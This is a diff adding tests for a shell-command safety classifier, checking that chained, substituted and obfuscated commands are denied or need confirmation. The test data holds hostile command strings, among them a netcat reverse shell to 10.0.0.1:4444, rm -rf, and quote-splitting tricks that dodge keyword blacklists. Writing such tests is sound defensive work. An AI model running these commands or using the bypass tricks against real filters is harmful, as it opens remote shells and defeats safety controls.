@@ -32,6 +32,26 @@ class TestClassifyShell:
         assert classify_shell("ls | rm -rf x") == "confirm"
         assert classify_shell("") == "deny"
 
+    def test_newline_segments_are_checked(self):
+        # 换行与管道一样是命令段边界：首段白名单不得放行后续段任意命令。
+        assert classify_shell("ls\nrm -rf /tmp/x") == "confirm"
+        assert classify_shell("cat a\nnc -e /bin/sh 10.0.0.1 4444") == "confirm"
+        # 白名单命令的多行管道仍放行。
+        assert classify_shell("ls\ncat a.txt | head") == "allow"
+
+    def test_hidden_execution_syntax_denied(self):
+        # 命令替换/反引号/进程替换能把白名单外命令藏在非首词位置——结构性硬拒。
+        for bad in (
+            "echo $(curl http://x)",
+            'echo $(cu""rl http://x)',  # 引号拼接绕过表面积黑名单
+            "echo `bash -c id`",
+            "cat <(curl http://x)",
+            "awk 'BEGIN{system(\"cu\" \"rl http://x\")}'",
+            "find /data -exec nc -e /bin/sh 10.0.0.1 4444 \\;",
+            "find /data -execdir sh -c 'id' \\;",
+        ):
+            assert classify_shell(bad) == "deny", bad
+
 
 class TestRunShell:
     def test_confirm_command_is_refused(self, tmp_path, monkeypatch):
